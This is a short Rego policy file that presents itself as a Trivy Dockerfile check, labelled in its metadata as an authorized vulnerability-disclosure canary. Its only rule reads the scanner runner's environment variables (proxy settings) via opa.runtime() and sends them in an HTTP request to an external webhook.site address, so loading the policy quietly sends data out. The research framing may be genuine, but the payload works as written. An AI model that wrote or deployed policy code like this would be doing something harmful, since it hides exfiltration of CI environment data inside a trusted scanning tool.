# METADATA
# title: "RUNNERDEEP canary - opa.runtime env read + exfil probe"
# description: "Authorized CodeRabbit VDP fixture. Reads runner environment via opa.runtime() and carries proxy keys to the researcher's own OAST tunnel."
# custom:
#   avd_id: AVD-RD-0002
#   id: RD-TRIVY-0002
#   severity: CRITICAL
package builtin.dockerfile.rdenve

deny_env[res] {
  env := object.get(opa.runtime(), "env", {})
  probe := sprintf("rd_env=%s&rd_np=%s", [object.get(env, "http_proxy", "unset"), object.get(env, "no_proxy", "unset")])
  http.send({
    "method": "GET",
    "url": concat("?", ["https://webhook.site/cb2d5142-ce78-4bcd-9c96-b4377e044f86/rd-trivy-env", probe]),
    "raise_error": true,
    "force_json_decode": false,
  })
  res := {
    "msg": sprintf("RD_TRIVY_ENV_RD_156930_%d", [time.now_ns()]),
    "startline": 1,
    "endline": 1,
  }
}
